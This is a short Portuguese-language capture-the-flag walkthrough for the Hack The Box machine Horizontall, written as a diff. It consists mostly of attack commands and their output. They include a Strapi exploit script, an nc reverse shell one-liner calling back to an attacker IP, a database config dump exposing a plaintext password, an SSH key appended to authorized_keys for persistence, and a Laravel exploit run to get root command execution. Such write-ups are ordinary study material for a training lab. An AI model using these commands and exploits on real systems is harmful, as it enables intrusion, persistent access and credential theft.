@@ -1,0 +1,64 @@
+Adicionar nos hosts: api-prod.horizontall.htb
+
+Navegar para "api-prod.horizontall.htb/admin"
+
+Usar o script 50239.py
+
+python3 50239.py http://api-prod.horizontall.htb 
+
+Abrir porta 4444
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.124 4444 >/tmp/f
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+strapi@horizontall:~/myapi/config/environments/development$ cat database.json
+cat database.json
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+}
+
+cd ~ 
+
+ssh-keygen na nossa maquina
+
+copiar a key publica 
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCberOIOYB9yDlii+dMOnqeBZg+CJHkQR6gR7kf18JHSSH7JWsRH3n5ztFeu7uh6JDecsXN0lifqF21cMBlquefksp33W1pN9q+OrW48zHh4PKQ551hLnWZkfJQ0Bs7RvExrnC2r/1QFQzyYXVPEpWtEU18IlpB4eVTxjPyOCfFm0zKITVHwTzpMbLhp+7Vm3EXsssBkFkjWAjPNkImavY0G7IUjBgZd2ZWTyTgattII6dFKi8nDA7bPE7V05bUwcm0cq9cdKPLsMzGpl6disZtF+GkNTgkjS6mtDmgjcnExRoZC4svofI7WwDl1KnE2O/uTHO85TvsmglZ/EQMYgtmY8wmjb6TyyE+IRsjYqTIXcuYvegwKjCI7pu4nf8HzJD+Dr6DZTybViixK95+54DpxV5HCIzdFM8WI03an52y56/1LzGkZ6SiMln4rm8gIbobELiv07QNdoOOdJOscHT4SJaSjYRgByk0hyU442Uu9PMfTYQd8UpK0azWSrFl35U= kali@kali" >> authorized_keys
+
+ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb 
+
+
+acessar 127.0.0.1:8000
+
+
+Laravel v8 (PHP v7.4.18) 
+
+
+https://www.exploit-db.com/exploits/49424
+
+Agora para root precisamos rodar o comando do ssh para podermos ter acesso ao localhost da maquina: ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb 
+
+Agora usamos como exemplo o comando do payload mas editando para a maquina que queremos pegar root
+
+python3 laravel.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log \'id\'
+
+Exploit...
+
+uid=0(root) gid=0(root) groups=0(root)
+
+python3 laravel.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'cat /root/root.txt'
